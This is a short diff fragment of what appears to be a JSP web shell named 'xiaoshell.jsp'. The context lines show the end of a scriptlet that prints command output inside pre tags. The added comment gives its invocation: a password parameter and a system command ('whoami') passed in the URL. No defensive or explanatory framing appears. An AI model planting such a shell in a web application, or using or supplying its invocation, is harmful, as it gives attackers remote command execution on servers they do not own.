@@ -10,3 +10,5 @@
         out.print("</pre>");
     }
 %>
+
+//xiaoshell.jsp?pwd=023&i=whoami
